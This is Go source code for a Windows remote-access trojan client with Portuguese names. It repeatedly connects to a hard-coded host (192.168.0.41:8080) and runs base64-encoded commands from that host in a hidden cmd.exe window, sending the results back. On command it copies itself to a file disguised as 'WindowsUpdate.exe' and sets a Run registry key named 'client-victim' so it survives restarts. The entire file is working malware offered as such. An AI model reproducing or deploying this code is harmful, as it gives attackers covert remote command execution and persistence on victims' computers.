package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"sys/windows/registry"
	"syscall"
	"time"
)

const (
	connHost = "192.168.0.41"
	connPort = "8080"
	connType = "tcp"
)

func autoReplica() {
	path, err := os.Executable()
	if err != nil {
		fmt.Print(err)
	}
	pathAlvo := `C:\Windows\Temp\WindowsUpdate.exe`
	c := exec.Command("cmd.exe", "/C", "copy", path, pathAlvo)
	c.Run()
}

func registraKeyDePersistencia() string {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		fmt.Print(err)
		return encodeB64([]byte("FALHA AO ABRIR A CHAVE 'Run'!\n"))
	}
	if err := k.SetStringValue("client-victim", `C:\Windows\Temp\WindowsUpdate.exe`); err != nil {
		fmt.Print(err)
		return encodeB64([]byte("FALHA AO SETAR O StringValue!\n"))
	}
	if err := k.Close(); err != nil {
		fmt.Print(err)
		return encodeB64([]byte("FALHA AO FECHAR A CHAVE!\n"))
	}
	return encodeB64([]byte("REGISTRY KEY CRIADA COM SUCESSO!\n"))
}

func trataErro(erro []byte) string {
	erroString := string(erro)
	var erroTratado []string = strings.Split(erroString, "exit status 1:")
	return erroTratado[1]
}

func encodeB64(entrada []byte) string {
	return b64.StdEncoding.EncodeToString([]byte(entrada))
}

func decodeB64(entrada []byte) string {
	bufferDec, _ := b64.StdEncoding.DecodeString(string(entrada))
	return string(bufferDec)
}

func execCodigoERetornaResultado(comando string) string {
	cmdPath := "C:\\Windows\\system32\\cmd.exe"
	c := exec.Command(cmdPath, "/C", comando)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := c.CombinedOutput()
	if err != nil {
		erro := []byte(fmt.Sprint(err) + ": " + string(out))
		erroTratado := trataErro(erro)
		return encodeB64([]byte(erroTratado)) + "\n"
	}
	outputEnc := encodeB64(out)
	return string(outputEnc + "\n")
}

func main() {
	for i := 1; i < 604800; i++ {
		time.Sleep(2 * time.Second)

		conn, err := net.Dial(connType, connHost+":"+connPort)

		if err != nil {
			continue
		}

		if err == nil {
			for {
				comando, _ := bufio.NewReader(conn).ReadString('\n')
				fmt.Printf(fmt.Sprint(comando))
				comandoDec := decodeB64([]byte(comando))

				if comandoDec == "background\n" || comandoDec == "exit\n" {
					conn.Close()
					break
				}

				switch comandoDec {

				case "session(persist)\n":
					autoReplica()
					resultado := registraKeyDePersistencia() + "\n"
					fmt.Fprint(conn, resultado)

				case "session(close)\n":
					conn.Close()
					os.Exit(0)

				default:
					resultado := execCodigoERetornaResultado(string(comandoDec))
					fmt.Fprint(conn, resultado)

				}
			}

		}
	}
}
